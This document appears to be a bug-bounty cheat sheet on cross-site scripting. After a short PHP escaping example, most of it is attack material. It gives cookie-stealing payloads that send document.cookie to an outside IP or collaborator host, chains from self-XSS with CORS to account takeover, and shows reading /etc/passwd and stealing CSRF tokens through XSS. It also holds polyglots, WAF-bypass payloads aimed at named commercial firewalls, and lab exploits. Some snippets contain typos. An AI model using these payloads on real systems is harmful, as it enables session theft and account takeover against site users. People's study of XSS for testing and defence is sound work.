- **Example For Vulnerable codes**
    
    ```php
    <!DOCTYPE html>
    <html>
    <body>
    
    <?php
    $txt = "PHP";
    echo "I love $txt!";
    ?>
    
    </body>
    </html>
    ```
    
- **Mitigation code**
    
    - Use htmlentities() Function
        
        ```php
        <!DOCTYPE html>
        <html>
        <body>
        
        <?php
        $txt = '"><script>alert(0)</script>';
        echo htmlentities("I love $txt!");
        ?>
        
        </body>
        </html>
        ```
        
    - Examples for htmlentities()
        
        ```php
        <?php
        $str = "A 'quote' is <b>bold</b>";
        
        // Outputs: A 'quote' is &lt;b&gt;bold&lt;/b&gt;
        echo htmlentities($str);
        
        // Outputs: A &#039;quote&#039; is &lt;b&gt;bold&lt;/b&gt;
        echo htmlentities($str, ENT_QUOTES);
        ?>
        ```
        
- **XSS Exploitation**
    
    - Self XSS + CORS = ATO
        
        ```bash
        <https://notifybugme.medium.com/chaining-cors-by-reflected-xss-to-account-takeover-my-first-blog-5b4f12b43c70>
        1. Got self XSS ?
        2. cat corstexturl.txt | CorsMe or cat corstexturl.txt | soru -u | anew |while read host do ; do curl -s — path-as-is — insecure -H “Origin: test.com” “$host” | grep -qs “Access-control-allow-origin: test.com” && echo “$host \\033[0;31m” cors Vulnerable;done
        3. So to exploit this CORS Misconfiguration we just need to replace the XSS payload alert(document.domain), with the following code:
        
        function cors() {  
        var xhttp = new XMLHttpRequest();  
        xhttp.onreadystatechange = function() {    
            if (this.status == 200) {    
            alert(this.responseText);     
            document.getElementById("demo").innerHTML = this.responseText;    
            }  
        };  
        xhttp.open("GET", "<https://www.attacker.com/api/account>", true);  
        xhttp.withCredentials = true;  
        xhttp.send();
        }
        cors();
        4. So here is the final POC
        <https://test.attacker.com/patter.jsp?facct=>"><script>function%20cors(){var%20xhttp=new%20XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.status==200) alert(this.responseText);document.getElementById("demo").innerHTML=this.responseText}};xhttp.open("GET","<https://www.attacker.com/api/account>",true);xhttp.withCredentials=true;xhttp.send()}cors();</script>
        ```
        
    - Self XSS to ATO
        
        ```python
        ## convert self xss to reflected one
        copy response in a file.html -> it will work
        ```
        
    - XSS to ATO
        
        ```jsx
        <script>
        fetch('<https://BURP-COLLABORATOR-SUBDOMAIN>', {
        method: 'POST',
        mode: 'no-cors',
        body:document.cookie
        });
        </script>
        ```
        
        ```jsx
        ## Cookie stealing through xss
        <https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py>
        <https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md>
        <script>var i=newImage;i.src="http://172.30.5.46:8888/?"+document.cookie;</script>
        <img src=x onerror=this.src='<http://172.30.5.46:8888/?'+document.cookie;>>
        <img src=x onerror="this.src='<http://172.30.5.46:8888/?'+document.cookie>; this.removeAttribute('onerror');">
        ```
        
    - XSS to RCE
        
        [https://swarm.ptsecurity.com/researching-open-source-apps-for-xss-to-rce-flaws/](https://swarm.ptsecurity.com/researching-open-source-apps-for-xss-to-rce-flaws/)
        
    - XSS to LFI
        
        ```jsx
        <script%00>
         x=new XMLHttpRequest;
         x.onload=function(){document.write(this.responseText)};
         x.open("GET","file:///etc/passwd");x.send();
         </script%00>
        
        <script>	x=new XMLHttpRequest;	x.onload=function(){ document.write(this.responseText)	};	x.open("GET","file:///etc/passwd");	x.send();</script>
        
        <img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
        <script>document.write('<iframe src=file:///etc/passwd></iframe>');</scrip>
        ```
        
    - XSS to SSRF
        
        ```python
        <esi:include src="<http://yoursite.com/capture>" />
        ```
        
    - XSS to CSRF
        
        - XSS to CSRF [ [https://link.medium.com/ct4S2BiJYwb](https://link.medium.com/ct4S2BiJYwb) ]
            
            POC : `[<https://vulnerable.site/profile.php?msg=><](<https://vulnerable.site/profile.php?msg=><script src=’https://attacker.site/attacker/script.js’></script>`
            
            ```jsx
            var csrfProtectedPage ='<https://vulnerable.site/profile.php>'
            var csrfProtectedForm ='form'
            //get valid token for current request
            var html = get(csrfProtectedPage);
            	document.getElementbyId(csrfProtectedForm);
            var token = form.token.value;
            
            //Build with valid token
            document.body.innerHTML+='form id="myform"action="+csrfProtectedPage+"method="POST">'+'<input id="password"name="name"value="hacked">'+'</form>';
            
            // Auto submit form
            document.forms["myfor"].submit();
            function get(url){
            var xmlHttp = new XMLHttpRequest();
            xamlHttp.open("GET", url.false);
            xmlHttp.send(null)
            return xmlHttp.responseText;
            }
            ```
            
        
        ```python
        <script>
        var req = new XMLHttpRequest();
        req.onload = handleResponse;
        req.open('get','/my-account',true);
        req.send();
        function handleResponse() {
            var token = this.responseText.match(/name="csrf" value="(\\w+)"/)[1];
            var changeReq = new XMLHttpRequest();
            changeReq.open('post', '/my-account/change-email', true);
            changeReq.send('csrf='+token+'&email=test@test.com')
        };
        </script>
        ```
        
    - XSS to Host Header Injection
        
        ```jsx
        ## host header injection through xss
        hostheader: bing.com">script>alert(document.domain)</script><"
        ```
        
    - XSS to Open Redirect
        
        ```jsx
        ## URL redirection through xss
        document.location.href="<http://evil.com>"
        ```
        
    - Phishing Via Iframe
        
        ```jsx
        ## phishing through xss - iframe injection
        <iframe src="<http://evil.com>" height="100" width="100"></iframe>
        ```
        
    - **Remote File Inclusion (RFI) to XSS**
        
        ```jsx
        php?=http://brutelogic.com.br/poc.svg
        ```
        
    - **File upload To XSS**
        
        ```jsx
        ## file upload  through XSS
        upload a picture file, intercept it, change picturename.jpg to xss payload using intruder attack
        ```
        
- **polyglots**
    
    ```jsx
    jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e
    ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
    “ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
    '">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="<http://i.imgur.com/P8mL8.jpg>">
    javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
    javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
    javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
    javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
    javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
    javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
    javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
    javascript://--></title></style></textarea></script><svg "//' onclick=alert()///</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
    ```
    

### **Waf Bypass Payloads**

- Collected Payloads
    
    ```html
    <style>*{background-image:url('\\\\6A\\\\61\\\\76\\\\61\\\\73\\\\63\\\\72\\\\69\\\\70\\\\74\\\\3A\\\\61\\\\6C\\\\65\\\\72\\\\74\\\\28\\\\6C\\\\6F\\\\63\\\\61\\\\74\\\\69\\\\6F\\\\6E\\\\29')}</style>
    %3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%58%53%53%22%29%3C%2F%73%63%72%69%70%74%3E
    [̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕
    "><input/onauxclick="[1].map(prompt)">
    <img src=x onerror=eval(atob('YWxlcnQoJ0kgb25seSB3cml0ZSBsYW1lIFBvQ3MnKQ==')) />
    '"--><Body onbeforescriptexecute="[1].map(confirm)">
    '-prompt.call(window, 'xss')-'
    <svg+onload=innerHTML=URL,outerHTML=textContent>#&ltimg/src/onerror=alert(domain)&gt
    <img src=x onVector=X-Vector onerror=alert(1)>
    %2sscript%2ualert()%2s/script%2u
    xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
    toString=\\\\u0061lert;window+' '
    aaaaa<h1 onclick=alert(1)>test
    <noscript><p title="</noscript><img src=x onerror=alert(document.domain)>">
    
    # Quick Defense:
    <input type="search" onsearch="aler\\\\u0074(1)">
    <details ontoggle="aler\\\\u0074(1)">
    
    # Unicode + HTML
    <svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
    
    # URL
    <a href="javascript:x='%27-alert(1)-%27';">XSS</a>
    
    # Hex
    <script>eval('\\\\x61lert(1)')</script>
    
    # Only lowercase block
    <sCRipT>alert(1)</sCRipT>
    
    # Break regex
    <script>%0aalert(1)</script>
    
    # Recursive filters
    <scr<script>ipt>alert(1)</scr</script>ipt>
    
    # Inject anchor tag
    <a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">
    
    # Bypass whitespaces
    <svg·onload=alert(1)>
    
    # Change GET to POST request
    
    # Imperva Incapsula
    %3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E
    <img/src="x"/onerror="[JS-F**K Payload]">
    <iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';><img/src=q onerror='new Function`al\\\\ert\\\\`1\\\\``'>
    
    # WebKnight
    <details ontoggle=alert(1)>
    <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
    
    # F5 Big IP
    <body style="height:1000px" onwheel="[DATA]">
    <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
    <body style="height:1000px" onwheel="[JS-F**k Payload]">
    <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[JS-F**k Payload]">
    <body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
    <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
    
    # PHP-IDS
    <svg+onload=+"[DATA]"
    <svg+onload=+"aler%25%37%34(1)"
    
    # Mod-Security
    <a href="j[785 bytes of (&NewLine;&Tab;)]avascript:alert(1);">XSS</a>
    1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
    <b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
    
    # Sucuri WAF
    1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
    
    # Akamai
    1%3C/script%3E%3Csvg/onload=prompt(document[domain])%3E
    <SCr%00Ipt>confirm(1)</scR%00ipt>
    
    # AngularJS
    {{constructor.constructor(alert 1 )()}}
    
    #html Sanitization Bypass
    <00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
    
    # Bypass ‘ ‘ ( ) 
    <iframe/src=javascript:alert%26%23x000000028%3b%27hacked%27)>
    # waf Bypass SVG
    <svg><a xlink:href=?usemap=/*&#x26;#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;*/onmouseover=window.focus()//>Hover me</a></svg>
    <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
    <textarea/onbeforeinput=kuro=&[#x27](tg://search_hashtag?hashtag=x27);//domain.tld&[#x27](tg://search_hashtag?hashtag=x27);;import(kuro)%09autofocus%09x>
    <div onpointerover="ja&#x76;ascr&#x69;pt:eva&#x6C;(decodeURICompo&#110;ent(String.fromCharCode(97, 108, 101, 114, 116, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110, 41)))" style="width:100%;height:100vh;"></div>
    Payload before obfuscation: <div onpointerover="javascript:alert([document.domain](http://document.domain/?trk=public_post-text))" style="width:100%;height:100vh;"></div>
    ```
    
- [NO SCRIPT](https://github.com/R0X4R/D4rkXSS/blob/master/noscript.txt)
    
    ```html
    <acronym><p title="</#{endtag}><svg/onload=alert(#{starttag})>">
    <bgsound><p title="</#{endtag}><svg/onload=alert(#{starttag})>">
    <xmp><p title="</#{endtag}><svg/onload=alert(#{starttag})>">
    ">'><details/open/ontoggle=confirm('XSS')>
    incapsulate bypass: <iframe/onload="var b ='document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b;this['src']=a">
    ```
    
- [Brutelogic](https://github.com/R0X4R/D4rkXSS/blob/master/brutelogic.txt)
    
    ```html
    \\'-alert(1)//
    </script><svg onload=alert(1)>
    <x contenteditable onblur=alert(1)>lose focus!
    ```
    
- **IMG Error**
    
    ```html
    <img onerror="location='javascript:=lert(1)'" src="x">
    <img onerror="location='javascript:%61lert(1)'" src="x">
    <img onerror="location='javascript:\\x2561lert(1)'" src="x">
    <img onerror="location='javascript:\\x255Cu0061lert(1)'" src="x" >
    ```
    
- [Jhaddix](https://github.com/R0X4R/D4rkXSS/blob/master/jhaddix.txt)
    
    ```jsx
    '%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E
    <<scr\\0ipt/src=http://xss.com/xss.js></script
    %27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E
    ' onmouseover=alert(/Black.Spook/)
    ```
    
- [RSnake](https://github.com/R0X4R/D4rkXSS/blob/master/rsnake.txt)
    
    ```jsx
    <SCRIPT>alert('XSS');</SCRIPT>
    '';!--"<XSS>=&{()}
    <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
    ```
    
- [Mario](https://github.com/R0X4R/D4rkXSS/blob/master/mario.txt)
    
    ```jsx
    <div id="1"><form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>//["'`-->]]>]</div><div id="2"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//["'`-->]]>]</div><div id="3"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//["'`-->]]>]</div><div id="4">0?<script>
    ```
    
- [seXSS](https://github.com/R0X4R/D4rkXSS/blob/master/seXSS.md)****
    
    > **Search Engine XSS [ google,yaho,…. ]**
    
- `${alert(1)}` ****Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped****
    
    ```jsx
    <script>
           var message = `0 search results for '\\u003clol\\u003e'`;
           document.getElementById('searchMessage').innerText = message;
    </script>
    ```
    
- ****Reflected XSS in a JavaScript URL with some characters blocked****
    
    ```jsx
    <https://0acb00f104aa459e80797b07005f0087.web-security-academy.net/post?postId=5&%27>},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
    ```
    
- ****Reflected XSS with AngularJS sandbox escape without strings****
    
    ```jsx
    <https://0ab200eb039caf1281bdacc000a5007e.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1>]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
    ```
    
- ****Reflected XSS with AngularJS sandbox escape and CSP****
    
    ```jsx
    <script>
    location='<https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x>';
    </script>
    ```
    
- ****Reflected XSS protected by CSP, with CSP bypass****
    
    ```jsx
    <https://0a67007704633ac081cf08c8008f006c.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27>
    ```
    
- **Check for Dom-XSS in Swagger-UI**
    
    - [https://github.com/doosec101/swagger_scanner](https://github.com/doosec101/swagger_scanner)
    - configUrl=https://jumpy-floor.surge.sh/test.json
    - ?url=https://jumpy-floor.surge.sh/test.yaml
- **[DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)**
    
    **Vulnerable Code**
    
    ```jsx
    <script>
                            window.addEventListener('message', function(e) {
                                document.getElementById('ads').innerHTML = e.data;
                            })
                        </script>
    ```
    
    **Exploit**
    
    ```python
    <iframe src="<https://target.com/>" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
    ```
    
- **[DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)**
    
    **Vulnerable code**
    
    ```jsx
    <script>
                            window.addEventListener('message', function(e) {
                                var url = e.data;
                                if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                    location.href = url;
                                }
                            }, false);
                        </script>
    ```
    
    **Exploit**
    
    ```python
    <iframe src="<https://target.com/>" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
    ```
    
- **[DOM XSS using web messages and `JSON.parse`](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)**
    
    **Vulnerable code**
    
    ```jsx
    <script>
                            window.addEventListener('message', function(e) {
                                var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                                document.body.appendChild(iframe);
                                try {
                                    d = JSON.parse(e.data);
                                } catch(e) {
                                    return;
                                }
                                switch(d.type) {
                                    case "page-load":
                                        ACMEplayer.element.scrollIntoView();
                                        break;
                                    case "load-channel":
                                        ACMEplayer.element.src = d.url;
                                        break;
                                    case "player-height-changed":
                                        ACMEplayer.element.style.width = d.width + "px";
                                        ACMEplayer.element.style.height = d.height + "px";
                                        break;
                                }
                            }, false);
                        </script>
    ```
    
    **Exploit**
    
    ```jsx
    <iframe src=https://<target.com>/ onload='this.contentWindow.postMessage("{\\"type\\":\\"load-channel\\",\\"url\\":\\"javascript:print()\\"}","*")'>
    ```
    
- **[DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)**
    
    **Vulnerable Request**
    
    ```jsx
    GET /product?productId=3 HTTP/2
    Host: 0a0500aa03c741a680172b2f00f4006e.web-security-academy.net
    Cookie: session=UqxhvcAmNGiFKyXTtDcZjENQWUSSiQUL; lastViewedProduct=https://0a0500aa03c741a680172b2f00f4006e.web-security-academy.net/product?productId=1
    Sec-Ch-Ua: "Chromium";v="111", "Not(A:Brand";v="8"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "Windows"
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: <https://0a0500aa03c741a680172b2f00f4006e.web-security-academy.net/>
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    ```
    
    **Exploit**
    
    ```jsx
    <iframe src="https://<target.com>/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://<target.com>';window.x=1;">
    ```
    
- **[Exploiting DOM clobbering to enable XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)**
    
    **Vulnerable code**
    
    ```jsx
    let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
    ```
    
    **Exploit**
    
    ```jsx
    <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
    ```
    
    **Explain**
    
    The `defaultAvatar` object is implemented using this dangerous pattern containing the logical `OR` operator in conjunction with a global variable. This makes it vulnerable to [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering).
    
    You can clobber this object using anchor tags. Creating two anchors with the same ID causes them to be grouped in a DOM collection. The `name` attribute in the second anchor contains the value `"avatar"`, which will clobber the `avatar` property with the contents of the `href` attribute.
    
    Notice that the site uses the `DOMPurify` filter in an attempt to reduce [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based). However, `DOMPurify` allows you to use the `cid:` protocol, which does not URL-encode double-quotes. This means you can inject an encoded double-quote that will be decoded at runtime. As a result, the injection described above will cause the `defaultAvatar` variable to be assigned the clobbered property `{avatar: ‘cid:"onerror=alert(1)//’}` the next time the page is loaded.
    
    When you make a second post, the browser uses the newly-clobbered global variable, which smuggles the payload in the `onerror` event handler and triggers the `alert()`
    
- **[Clobbering DOM attributes to bypass HTML filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)**
    
    **exploit**
    
    ```jsx
    Go to one of the blog posts and create a comment containing the following HTML:
    <form id=x tabindex=0 onfocus=print()><input id=attributes>
    ----------------------------------------------------------------------------------------------------------
    Go to the exploit server and add the following iframe to the body:
    <iframe src=https://<target.com>.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
    ```
    
    **Explain**
    
    The library uses the `attributes` property to filter HTML attributes. However, it is still possible to clobber the `attributes` property itself, causing the length to be undefined. This allows us to inject any attributes we want into the `form` element. In this case, we use the `onfocus` attribute to smuggle the `print()` function.
    
    When the `iframe` is loaded, after a 500ms delay, it adds the `#x` fragment to the end of the page URL. The delay is necessary to make sure that the comment containing the injection is loaded before the JavaScript is executed. This causes the browser to focus on the element with the ID `"x"`, which is the form we created inside the comment. The `onfocus` event handler then calls the `print()` function.
    
- **Stored XSS via SVG file**
    
    is an example of a basic SVG file that will show a picture of a `rectang`
    
    ```
    <svg width="400" height="110">  <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" /> </svg><!--This means you can place an SVG file in an image tag and it will render perfectly:--><img src="rectangle.svg" alt="Rectangle" height="42" width="42"><!-- An example SVG file with an alert XSS payload can be found below:--><?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "<http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd>"><svg version="1.1" baseProfile="full" xmlns="<http://www.w3.org/2000/svg>"> <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" /> <script type="text/javascript"> alert("h0tak88r_XSS"); </script></svg>
    
    ```
    
- **XSS Reflected in JSON Format and “{}” Forbidden**
    
    - [ ] `/?q=test%2Aconsole.log(1337)//’;`
    
    ![https://user-images.githubusercontent.com/108616378/219940132-46f7abe3-2ac4-425d-aa29-09e54d2c62b4.png](https://user-images.githubusercontent.com/108616378/219940132-46f7abe3-2ac4-425d-aa29-09e54d2c62b4.png)
    
- **XSS Reflected in `<link>` OR `<input type=hidden>` attribute when add param**
    
    - [ ] `/?lol=h0tak88r’accesskey=’x’onclick=’alert(0)’` But the Victim must click `ALT+SHIFT+X`
    
    ![https://user-images.githubusercontent.com/108616378/219940162-49b746e2-b5a2-46ff-bcd2-0d2755a131a8.png](https://user-images.githubusercontent.com/108616378/219940162-49b746e2-b5a2-46ff-bcd2-0d2755a131a8.png)
    
- **XSS in email section**
    
    ```jsx
    admin1@example.com<script>alert('xss');</script> 
    “><svg/onload=confirm(1)>”@x.y 
    "hello<form/><!><details/open/ontoggle=alert(1)>"@gmail.com 
    ["');alert('XSS');//"]@xyz.xxx 
    "<svg/onload=alert(1)>"@gmail.com 
    test@gmail.com%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E
    
    ```
    
- **XSS for .JSON endpoint [ bypass (`.html`)and `WAF` ]**
    
    - [ ] `“resource Type” : “silent:nonexitsting”` Function
        
        ![https://user-images.githubusercontent.com/108616378/219940178-c7988e77-c51a-4e79-add2-e0b192d92e02.png](https://user-images.githubusercontent.com/108616378/219940178-c7988e77-c51a-4e79-add2-e0b192d92e02.png)
        
    - [ ] Use `url-encoded` payload with .`htm` extension and `//` for break directory block too , So the server so the server didn’t understand my request fully
        
    - [ ] POC
        
    
    ```
    <https://www.redacted.com/etc/designs/redacted.json//%3Csvg%20onload=alert(document.domain)%3E.html>
    
    ```
    
- **XSS Bypass for Rich Text Editors**
    
    ```jsx
    First, try all the built-in functions like bold, links, and embedded images.
    <</p>iframe src=javascript:alert()//
    <a href="aaa:bbb">x</a>
    <a href="j%26Tab%3bavascript%26colon%3ba%26Tab%3blert()">x</a>
    [Click on me to claim 100$ vouchers](<https://evil.com>) -> Hyperlink Injection
    ```
    
- **XSS in meta tag**
    
    - [ ] [XSS bypass using META tag in realestate.postnl.nl | by Prial Islam Khan | InfoSec Write-ups (infosecwriteups.com)](https://infosecwriteups.com/xss-bypass-using-meta-tag-in-realestate-postnl-nl-32db25db7308)

# Top XSS reports from HackerOne:

1. [Bypass for #488147 enables stored XSS on](https://hackerone.com/reports/510152) [https://paypal.com/signin](https://paypal.com/signin) again to PayPal - 2530 upvotes, $20000
2. [Stored XSS on](https://hackerone.com/reports/488147) [https://paypal.com/signin](https://paypal.com/signin) via cache poisoning to PayPal - 646 upvotes, $18900
3. [Reflected XSS on](https://hackerone.com/reports/846338) [https://www.glassdoor.com/employers/sem-dual-lp/](https://www.glassdoor.com/employers/sem-dual-lp/) to Glassdoor - 632 upvotes, $1000
4. [Stored XSS in Wiki pages](https://hackerone.com/reports/526325) to GitLab - 595 upvotes, $4500
5. [Stored XSS on imgur profile](https://hackerone.com/reports/484434) to Imgur - 591 upvotes, $650
6. [Reflected XSS in OAUTH2 login flow](https://hackerone.com/reports/697099) to LINE - 471 upvotes, $1989
7. [XSS in steam react chat client](https://hackerone.com/reports/409850) to Valve - 453 upvotes, $7500
8. [Cross-Site-Scripting on www.tiktok.com and m.tiktok.com leading to Data Exfiltration](https://hackerone.com/reports/968082) to TikTok - 449 upvotes, $3860
9. [XSS vulnerable parameter in a location hash](https://hackerone.com/reports/146336) to Slack - 440 upvotes, $1100
10. [One-click account hijack for anyone using Apple sign-in with Reddit, due to response-type switch + leaking href to XSS on www.redditmedia.com](https://hackerone.com/reports/1567186) to Reddit - 419 upvotes, $10000
11. [Panorama UI XSS leads to Remote Code Execution via Kick/Disconnect Message](https://hackerone.com/reports/631956) to Valve - 407 upvotes, $9000
12. [Blind XSS on image upload](https://hackerone.com/reports/1010466) to CS Money - 407 upvotes, $1000
13. [Stored XSS Vulnerability](https://hackerone.com/reports/643908) to WordPress - 394 upvotes, $500
14. [Reflected XSS and sensitive data exposure, including payment details, on lioncityrentals.com.sg](https://hackerone.com/reports/340431) to Uber - 369 upvotes, $4000
15. [Reflected XSS on www.hackerone.com and resources.hackerone.com](https://hackerone.com/reports/840759) to HackerOne - 355 upvotes, $500
16. [Stored XSS in wordpress.com](https://hackerone.com/reports/733248) to Automattic - 348 upvotes, $650
17. [HEY.com email stored XSS](https://hackerone.com/reports/982291) to Basecamp - 345 upvotes, $5000
18. [Reflected XSS in TikTok endpoints](https://hackerone.com/reports/1350887) to TikTok - 344 upvotes, $4500
19. [Blind XSS on Twitter's internal Big Data panel at █████████████](https://hackerone.com/reports/1207040) to Twitter - 338 upvotes, $5040
20. [Stored XSS in Private Message component (BuddyPress)](https://hackerone.com/reports/487081) to WordPress - 331 upvotes, $500
21. [XSS while logging using Google](https://hackerone.com/reports/691611) to Shopify - 325 upvotes, $1750
22. [Stored XSS in my staff name fired in another your internal panel](https://hackerone.com/reports/946053) to Shopify - 316 upvotes, $5000
23. [DOM XSS on duckduckgo.com search](https://hackerone.com/reports/868934) to DuckDuckGo - 316 upvotes, $0

## Cross Site Scripting (XSS) Write_ups

- [From P5 to P2 to 100 BXSS](https://medium.com/@mohameddaher/from-p5-to-p5-to-p2-from-nothing-to-1000-bxss-4dd26bc30a82)
- [Google Acquisition XSS (Apigee)](https://medium.com/@TnMch/google-acquisition-xss-apigee-5479d7b5dc4)
- [DOM-Based XSS at accounts.google.com by Google Voice Extension](http://www.missoumsai.com/google-accounts-xss.html)
- [XSS on Microsoft.com via Angular Js template injection](https://medium.com/@impratikdabhi/reflected-xss-on-microsoft-com-via-angular-template-injection-2e26d80a7fd8)
- [Researching Polymorphic Images for XSS on Google Scholar](https://blog.doyensec.com/2020/04/30/polymorphic-images-for-xss.html)
- [Netflix Party Simple XSS](https://medium.com/@kristian.balog/netflix-party-simple-xss-ec92ed1d7e18)
- [Stored XSS in google nest](https://medium.com/bugbountywriteup/stored-xss-in-google-nest-a82373bbda68)
- [Self XSS to persistent XSS on login portal](https://medium.com/@nnez/always-escalate-from-self-xss-to-persistent-xss-on-login-portal-54265b0adfd0)
- [Universal XSS affecting Firefox](https://0x65.dev/blog/2020-03-30/cve-2019-17004-semi-universal-xss-affecting-firefox-for-ios.html)
- [XSS WAF Character limitation bypass like a boss](https://medium.com/bugbountywriteup/xss-waf-character-limitation-bypass-like-a-boss-2c788647c229)
